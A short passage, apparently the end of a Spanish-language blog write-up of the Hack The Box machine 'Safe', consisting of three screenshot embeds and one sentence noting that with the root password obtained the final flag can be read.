![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/38.png){:class="blog-image" onclick="expandImage(this)"} 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/39.png){:class="blog-image" onclick="expandImage(this)"} 

Y ya con la contraseña del usuario root en nuestro poder, podremos listar la última flag.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/40.png){:class="blog-image" onclick="expandImage(this)"} 
